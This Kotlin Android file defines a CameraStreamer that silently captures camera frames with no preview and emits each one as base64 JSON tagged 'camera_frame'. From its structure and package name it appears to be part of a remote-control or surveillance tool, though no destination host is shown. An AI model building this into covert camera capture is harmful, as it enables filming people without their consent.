package com.app.cyber

import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import org.json.JSONObject

object CameraStreamer {

    private var device: CameraDevice? = null
    private var session: CameraCaptureSession? = null
    private var reader: ImageReader? = null
    private var thread: HandlerThread? = null

    fun start(ctx: Context, facing: Int, emit: (JSONObject) -> Unit) {
        if (device != null) return
        
        try {
            val mgr = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            
            val id = mgr.cameraIdList.firstOrNull { 
                mgr.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == facing 
            } ?: return
            
            thread = HandlerThread("cam").also { it.start() }
            val handler = Handler(thread!!.looper)
            
            reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 3)
            reader!!.setOnImageAvailableListener({ r ->
                val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                val bytes = ByteArray(img.planes[0].buffer.remaining())
                img.planes[0].buffer.get(bytes)
                img.close()
                
                val payload = JSONObject()
                payload.put("action", "camera_frame")
                payload.put("data", Base64.encodeToString(bytes, Base64.NO_WRAP))
                emit(payload)
            }, handler)
            
            mgr.openCamera(id, object : CameraDevice.StateCallback() {
                override fun onOpened(cam: CameraDevice) {
                    device = cam
                    val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                    req.addTarget(reader!!.surface)
                    
                    cam.createCaptureSession(listOf(reader!!.surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(s: CameraCaptureSession) {
                            session = s
                            s.setRepeatingRequest(req.build(), null, handler)
                        }
                        override fun onConfigureFailed(s: CameraCaptureSession) {}
                    }, handler)
                }
                override fun onDisconnected(cam: CameraDevice) {}
                override fun onError(cam: CameraDevice, e: Int) {}
            }, handler)
            
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun stop() {
        try {
            session?.close()
            device?.close()
            reader?.close()
            thread?.quitSafely()
        } catch (e: Exception) {
            e.printStackTrace()
        }
        device = null
        session = null
        reader = null
        thread = null
    }
}
